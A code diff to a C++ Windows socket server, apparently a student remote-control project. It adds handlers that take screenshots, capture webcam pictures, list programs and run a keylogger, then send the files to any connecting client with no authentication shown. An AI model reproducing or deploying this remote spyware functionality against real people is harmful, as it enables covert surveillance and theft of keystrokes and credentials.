@@ -1,96 +1,107 @@
 #include "../Application/lib.h"
 #include "../Application/executeCommand.h"
 
-static string trim(const string& s) {
+const string saveDir = "C:/Users/Tien/Documents/Client-Server/";
+
+std::map<std::string, std::function<void(std::string &)>> commandHandlers = {
+    {"get_screenshot",
+     [](std::string &outFile) {
+       outFile = saveDir + "screenshot.png";
+       take_screenshot(outFile);
+     }},
+    {"get_picture",
+     [](std::string &outFile) {
+       outFile = saveDir + "picture.png";
+       take_picture(outFile);
+     }},
+    {"list_program",
+     [](std::string &outFile) {
+       outFile = saveDir + "programs.txt";
+       list_programs_to_file(outFile);
+     }},
+    {"keylogger", [](std::string &outFile) {
+       outFile = saveDir + "keylog.txt";
+       run_keylogger_and_save(outFile, 10);
+     }}};
+
+void send_file_over_socket(SOCKET sock, const std::string &filename) {
+  std::ifstream file(filename, std::ios::binary);
+  if (!file) {
+    size_t fileSize = 0;
+    send(sock, reinterpret_cast<const char *>(&fileSize), sizeof(fileSize), 0);
+    return;
+  }
+
+  file.seekg(0, std::ios::end);
+  size_t fileSize = file.tellg();
+  file.seekg(0, std::ios::beg);
+
+  send(sock, reinterpret_cast<const char *>(&fileSize), sizeof(fileSize), 0);
+
+  char buffer[4096];
+  while (file) {
+    file.read(buffer, sizeof(buffer));
+    send(sock, buffer, file.gcount(), 0);
+  }
+}
+
+static std::string trim(const std::string &s) {
   size_t a = s.find_first_not_of(" \r\n\t");
-  if (a == string::npos) return "";
+  if (a == std::string::npos) return "";
   size_t b = s.find_last_not_of(" \r\n\t");
   return s.substr(a, b - a + 1);
 }
 
 int main() {
   WSADATA wsa;
-  if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-    cerr << "[Server] WSAStartup error: " << WSAGetLastError() << endl;
-    return 1;
-  }
+  WSAStartup(MAKEWORD(2, 2), &wsa);
 
-  int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
-  if (serverSocket == INVALID_SOCKET) {
-    cerr << "[Server] Cannot create socket: " << WSAGetLastError() << endl;
-    WSACleanup();
-    return 1;
-  }
-
+  SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
   sockaddr_in serverAddr{};
   serverAddr.sin_family = AF_INET;
   serverAddr.sin_port = htons(8888);
   serverAddr.sin_addr.s_addr = INADDR_ANY;
 
-  if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) ==
-      SOCKET_ERROR) {
-    cerr << "[Server] Bind error: " << WSAGetLastError() << endl;
-    closesocket(serverSocket);
-    WSACleanup();
-    return 1;
-  }
+  bind(serverSocket, (sockaddr *)&serverAddr, sizeof(serverAddr));
+  listen(serverSocket, 5);
 
-  if (listen(serverSocket, 5) == SOCKET_ERROR) {
-    cerr << "[Server] Listen error: " << WSAGetLastError() << endl;
-    closesocket(serverSocket);
-    WSACleanup();
-    return 1;
-  }
-
-  cout << "[Server] Listening on port 8888...\n";
+  std::cout << "[Server] Listening on port 8888...\n";
 
   while (true) {
     sockaddr_in clientAddr{};
     int clientSize = sizeof(clientAddr);
-    int clientSocket =
-        accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
-    if (clientSocket == INVALID_SOCKET) {
-      cerr << "[Server] Accept error: " << WSAGetLastError() << endl;
-      continue;
-    }
-
-    cout << "[Server] Client connected.\n";
+    SOCKET clientSocket =
+        accept(serverSocket, (sockaddr *)&clientAddr, &clientSize);
+    if (clientSocket == INVALID_SOCKET) continue;
 
     char buffer[4096] = {};
     int bytes = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
     if (bytes <= 0) {
-      cerr << "[Server] Receive failed or connection closed.\n";
       closesocket(clientSocket);
       continue;
     }
     buffer[bytes] = '\0';
-    string payload = buffer;
+    std::istringstream iss(buffer);
 
-    std::istringstream iss(payload);
-    string sender_email;
-    if (!std::getline(iss, sender_email)) {
-      cerr << "[Server] Malformed payload: missing sender\n";
-      string nack = "Malformed payload";
-      send(clientSocket, nack.c_str(), static_cast<int>(nack.size()), 0);
-      closesocket(clientSocket);
-      continue;
-    }
+    std::string sender_email, command;
+    std::getline(iss, sender_email);
+    std::getline(iss, command);
+
     sender_email = trim(sender_email);
-    cout << "[Server] Sender: " << sender_email << endl;
+    command = trim(command);
 
-    string line;
-    while (std::getline(iss, line)) {
-      line = trim(line);
-      if (line.empty()) continue;
-      cout << "[Server] Executing command: " << line << " for " << sender_email
-           << endl;
-      execute_command_with_sender(sender_email, line);
+    std::cout << "[Server] Command from " << sender_email << ": " << command
+              << "\n";
+
+    if (commandHandlers.count(command)) {
+      std::string outputFile;
+      commandHandlers[command](outputFile);
+      send_file_over_socket(clientSocket, outputFile);
+    } else {
+      execute_command_with_sender(sender_email, command);
     }
 
-    string ack = "Commands processed";
-    send(clientSocket, ack.c_str(), static_cast<int>(ack.size()), 0);
     closesocket(clientSocket);
-    cout << "[Server] Connection closed.\n";
   }
 
   closesocket(serverSocket);
